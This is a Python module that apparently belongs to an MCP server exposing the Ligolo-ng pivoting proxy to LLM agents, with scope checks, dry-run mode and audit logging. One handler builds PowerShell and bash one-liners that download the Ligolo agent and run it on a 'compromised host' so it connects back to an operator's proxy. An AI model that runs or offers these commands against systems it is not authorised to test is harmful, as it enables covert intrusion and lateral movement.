"""Ligolo-ng tools.

Wraps the Ligolo-ng ``proxy`` binary running on the operator's machine.

Ligolo-ng itself is an interactive CLI; many sub-commands (session select,
``start`` tunnel, etc.) require stdin after the agent has connected. MCP
tools here therefore focus on the **management** surface that makes sense
for LLM-driven automation:

    * ``ligolo_start_proxy``      — spawn the proxy in the background
    * ``ligolo_stop_proxy``       — stop a running proxy
    * ``ligolo_proxy_status``     — is the proxy running? health check
    * ``ligolo_list_listeners``   — enumerate reverse listeners (API-based)
    * ``ligolo_add_route``        — add a static route via Windows/Linux CLI
    * ``ligolo_generate_agent_command`` — produce the exact one-liner to
      run on the victim host (no network call, pure helper)
"""

from __future__ import annotations

import os
import signal
import subprocess
import sys
from pathlib import Path
from typing import Any

from ..config import Settings
from ..executor import resolve_binary, run_command
from ..logging import audit_event
from ..security import ScopeGuard
from .base import ToolModule, ToolResult, ToolSpec

_PID_FILE_NAME = "ligolo-proxy.pid"


class LigoloModule(ToolModule):
    id = "ligolo"

    def __init__(self, settings: Settings, scope_guard: ScopeGuard) -> None:
        super().__init__(settings, scope_guard)
        block = self.settings.tools.ligolo
        self._binary_hint: str | None = getattr(block, "binary", None) or getattr(
            block, "proxy_binary", None
        )
        runs_dir = settings.expanded_path(settings.execution.working_dir)
        runs_dir.mkdir(parents=True, exist_ok=True)
        self._pid_file = runs_dir / _PID_FILE_NAME

    def _binary(self) -> str:
        return resolve_binary(self._binary_hint, "proxy")

    def specs(self) -> list[ToolSpec]:
        return [
            ToolSpec(
                name="ligolo_start_proxy",
                description=(
                    "Start the Ligolo-ng proxy in the background so agents on pivoted "
                    "hosts can connect back. Uses a self-signed cert by default; for "
                    "production engagements supply ``cert_path``/``key_path``."
                ),
                input_schema={
                    "type": "object",
                    "properties": {
                        "listen_addr": {
                            "type": "string",
                            "default": "0.0.0.0:11601",
                            "description": "host:port the agent will call back to.",
                        },
                        "self_cert": {
                            "type": "boolean",
                            "default": True,
                            "description": "Use a disposable self-signed TLS cert.",
                        },
                        "cert_path": {"type": "string"},
                        "key_path": {"type": "string"},
                        "autocert_domain": {
                            "type": "string",
                            "description": "Domain for automatic Let's Encrypt issuance.",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_start,
                dangerous=True,
                tags=["c2", "pivoting"],
            ),
            ToolSpec(
                name="ligolo_stop_proxy",
                description="Stop the proxy previously started by ligolo_start_proxy.",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_stop,
                tags=["c2"],
            ),
            ToolSpec(
                name="ligolo_proxy_status",
                description=(
                    "Return whether the proxy is currently running (based on the PID "
                    "file maintained by this server)."
                ),
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_status,
                tags=["c2", "meta"],
            ),
            ToolSpec(
                name="ligolo_generate_agent_command",
                description=(
                    "Produce the exact one-liner command an operator should run on "
                    "a compromised host (Windows or Linux) so the agent dials back. "
                    "Does NOT execute anything — pure helper."
                ),
                input_schema={
                    "type": "object",
                    "required": ["callback_addr"],
                    "properties": {
                        "callback_addr": {
                            "type": "string",
                            "description": "Public host:port where the proxy listens.",
                        },
                        "os_family": {
                            "type": "string",
                            "enum": ["windows", "linux", "darwin"],
                            "default": "windows",
                        },
                        "ignore_cert": {
                            "type": "boolean",
                            "default": True,
                            "description": "Skip TLS validation (needed with self-signed).",
                        },
                        "socks_proxy": {
                            "type": "string",
                            "description": "Optional socks5://user:pass@host:port outbound.",
                        },
                        "http_proxy": {
                            "type": "string",
                            "description": "Optional http://host:port outbound.",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_generate_agent,
                tags=["c2", "helper"],
            ),
            ToolSpec(
                name="ligolo_add_route",
                description=(
                    "Add an IPv4 route through the Ligolo TUN interface on the "
                    "operator machine (requires admin/root). Used after the tunnel "
                    "is up to route a new internal subnet through the agent."
                ),
                input_schema={
                    "type": "object",
                    "required": ["cidr"],
                    "properties": {
                        "cidr": {
                            "type": "string",
                            "description": "Subnet in CIDR form, e.g. 10.0.0.0/16.",
                        },
                        "tun_name": {
                            "type": "string",
                            "default": "ligolo",
                            "description": "TUN interface name (Linux) or alias (Windows).",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_add_route,
                dangerous=True,
                requires_scope_field="cidr",
                tags=["c2", "routing"],
            ),
        ]

    async def _handle_start(self, arguments: dict[str, Any]) -> ToolResult:
        if self._pid_file.exists():
            try:
                pid = int(self._pid_file.read_text("utf-8").strip())
                if _is_running(pid):
                    return ToolResult.error(
                        f"Ligolo proxy already running with PID {pid}. "
                        "Call ligolo_stop_proxy first."
                    )
            except (ValueError, OSError):
                pass

        binary = self._binary()
        argv: list[str] = [binary, "-laddr", arguments.get("listen_addr", "0.0.0.0:11601")]
        if arguments.get("self_cert", True) and not arguments.get("cert_path"):
            argv.append("-selfcert")
        if cert := arguments.get("cert_path"):
            argv += ["-certfile", cert]
        if key := arguments.get("key_path"):
            argv += ["-keyfile", key]
        if domain := arguments.get("autocert_domain"):
            argv += ["-autocert", "-certfile", domain]

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would start: {' '.join(argv)}",
                structured={"dry_run": True, "argv": argv},
            )

        log_path = self._pid_file.with_suffix(".log")
        try:
            log_fh = log_path.open("ab")
            proc = subprocess.Popen(  # noqa: S603
                argv,
                stdout=log_fh,
                stderr=log_fh,
                stdin=subprocess.DEVNULL,
                cwd=str(Path(binary).parent),
                creationflags=(
                    subprocess.CREATE_NEW_PROCESS_GROUP if sys.platform == "win32" else 0
                ),
            )
        except OSError as exc:
            return ToolResult.error(f"Failed to spawn ligolo proxy: {exc}")

        self._pid_file.write_text(str(proc.pid), encoding="utf-8")
        audit_event(
            self.log,
            "ligolo.start",
            pid=proc.pid,
            listen_addr=arguments.get("listen_addr"),
            log=str(log_path),
        )
        return ToolResult(
            text=f"Ligolo proxy started: PID {proc.pid}, listening on "
            f"{arguments.get('listen_addr', '0.0.0.0:11601')}. Logs: {log_path}",
            structured={
                "pid": proc.pid,
                "listen_addr": arguments.get("listen_addr", "0.0.0.0:11601"),
                "log_path": str(log_path),
            },
        )

    async def _handle_stop(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="Ligolo proxy is not running.", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            self._pid_file.unlink(missing_ok=True)
            return ToolResult.error("PID file was malformed; removed.")

        if not _is_running(pid):
            self._pid_file.unlink(missing_ok=True)
            return ToolResult(
                text=f"PID {pid} already exited; cleaned up.", structured={"running": False}
            )

        try:
            if sys.platform == "win32":
                os.kill(pid, signal.CTRL_BREAK_EVENT)
            else:
                os.kill(pid, signal.SIGTERM)
        except OSError as exc:
            return ToolResult.error(f"Failed to signal PID {pid}: {exc}")

        self._pid_file.unlink(missing_ok=True)
        audit_event(self.log, "ligolo.stop", pid=pid)
        return ToolResult(text=f"Stopped ligolo proxy PID {pid}.", structured={"stopped_pid": pid})

    async def _handle_status(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="not running", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            return ToolResult.error("PID file corrupt")
        running = _is_running(pid)
        if not running:
            self._pid_file.unlink(missing_ok=True)
        return ToolResult(
            text=f"pid={pid} running={running}",
            structured={"pid": pid, "running": running},
        )

    async def _handle_generate_agent(self, arguments: dict[str, Any]) -> ToolResult:
        callback = arguments["callback_addr"]
        os_family = arguments.get("os_family", "windows")
        ignore_cert = arguments.get("ignore_cert", True)
        socks_proxy = arguments.get("socks_proxy")
        http_proxy = arguments.get("http_proxy")

        flags = [f"-connect {callback}"]
        if ignore_cert:
            flags.append("-ignore-cert")
        if socks_proxy:
            flags.append(f"-proxy {socks_proxy}")
        elif http_proxy:
            flags.append(f"-proxy {http_proxy}")
        flag_str = " ".join(flags)

        if os_family == "windows":
            one_liner = f".\\agent.exe {flag_str}"
            ps_one_liner = (
                "$u='https://github.com/nicocha30/ligolo-ng/releases/latest/download/"
                "ligolo-ng_agent_latest_windows_amd64.zip';"
                "Invoke-WebRequest $u -OutFile $env:TEMP\\a.zip;"
                "Expand-Archive $env:TEMP\\a.zip $env:TEMP\\la -Force;"
                f"& $env:TEMP\\la\\agent.exe {flag_str}"
            )
            bundle = {
                "manual": one_liner,
                "powershell_one_liner": ps_one_liner,
                "notes": "Run from an elevated shell for best TUN compatibility.",
            }
        else:
            manual = f"./agent {flag_str}"
            bash_one_liner = (
                "U=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest "
                "| grep browser_download_url | grep 'agent.*linux_amd64.tar.gz' "
                "| head -n1 | cut -d'\"' -f4);"
                "curl -sL $U -o /tmp/a.tgz; mkdir -p /tmp/la && tar -xzf /tmp/a.tgz -C /tmp/la;"
                f"/tmp/la/agent {flag_str}"
            )
            bundle = {
                "manual": manual,
                "bash_one_liner": bash_one_liner,
                "notes": "Agent runs as unprivileged user.",
            }

        audit_event(
            self.log,
            "ligolo.gen_agent_cmd",
            callback=callback,
            os=os_family,
            has_proxy=bool(socks_proxy or http_proxy),
        )
        return ToolResult(
            text=f"Agent command for {os_family} -> {callback}",
            structured=bundle,
        )

    async def _handle_add_route(self, arguments: dict[str, Any]) -> ToolResult:
        cidr = arguments["cidr"]
        await self.ensure_scope(cidr, tool_name="ligolo_add_route")
        tun = arguments.get("tun_name", "ligolo")

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would add route {cidr} via {tun}",
                structured={"dry_run": True, "cidr": cidr, "tun": tun},
            )

        if sys.platform == "win32":
            argv = ["route", "add", _cidr_to_win(cidr), _cidr_mask(cidr), "-p"]
        else:
            argv = ["ip", "route", "add", cidr, "dev", tun]

        result = await run_command(
            argv,
            timeout_sec=30,
            max_output_bytes=64 * 1024,
        )
        audit_event(
            self.log,
            "ligolo.add_route",
            cidr=cidr,
            tun=tun,
            exit_code=result.exit_code,
        )
        return ToolResult(
            text=f"{'Added' if result.ok else 'Failed to add'} route {cidr} via {tun}",
            structured={
                "cidr": cidr,
                "tun": tun,
                "argv": argv,
                "exit_code": result.exit_code,
                "stdout": result.stdout,
                "stderr": result.stderr,
            },
            is_error=not result.ok,
        )


def _is_running(pid: int) -> bool:
    if sys.platform == "win32":
        try:
            output = subprocess.check_output(  # noqa: S603,S607
                ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            return str(pid) in output
        except (OSError, subprocess.SubprocessError):
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def _cidr_to_win(cidr: str) -> str:
    return cidr.split("/", 1)[0]


def _cidr_mask(cidr: str) -> str:
    import ipaddress

    net = ipaddress.ip_network(cidr, strict=False)
    return str(net.netmask)
